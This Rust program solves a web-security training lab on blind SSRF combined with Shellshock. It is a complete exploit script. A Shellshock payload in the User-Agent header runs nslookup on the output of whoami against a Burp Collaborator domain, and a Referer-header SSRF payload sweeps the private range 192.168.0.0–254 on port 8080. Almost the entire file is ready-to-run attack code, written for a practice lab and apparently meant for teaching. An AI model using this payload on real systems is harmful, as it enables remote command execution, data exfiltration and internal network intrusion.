/******************************************************************************
*
* Lab: Blind SSRF with Shellshock exploitation
*
* Hack Steps:
*      1. Inject shellshock payload into the User-Agent header to exfiltrate
*         the OS user via DNS lookup
*      2. Inject SSRF payload into the Referer header to iterate over
*         all private IPs
*      3. Check your burp collaborator for the OS user in the DNS lookup
*      4. Submit the solution
*
*******************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a4100b903b9c9228318298c00850055.web-security-academy.net";

// Change this to your burp collaborator domain
const BURP_COLLABORATOR: &str = "ojbe5v7hak1nxpynrlu5iatd248vwlka.oastify.com";

fn main() {
    println!(
        "⦗#⦘ Injection points: {}",
        "User Agent & Referer headers".yellow()
    );

    let shellshock_payload =
        format!("() {{ 42;}};echo;/bin/nslookup $(/bin/whoami).{BURP_COLLABORATOR}");

    for x in 0..255 {
        let payload = format!("http://192.168.0.{x}:8080");

        print!(
            "\r❯❯ Injecting shellshock payload with SSRF to all private IPs ({}).. ",
            payload.yellow()
        );
        io::stdout().flush().unwrap();

        fetch_product_with_referer_and_user_agent(&payload, &shellshock_payload);

        print!("{}", "OK".green());
    }

    println!("\n🗹 Check your burp collaborator for the OS user in the DNS lookup then submit the solution");
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch_product_with_referer_and_user_agent(referer: &str, user_agent: &str) {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}/product?productId=1"))
        .header("Referer", referer)
        .header("User-Agent", user_agent)
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the page with the injected payload".red()
        ));
}
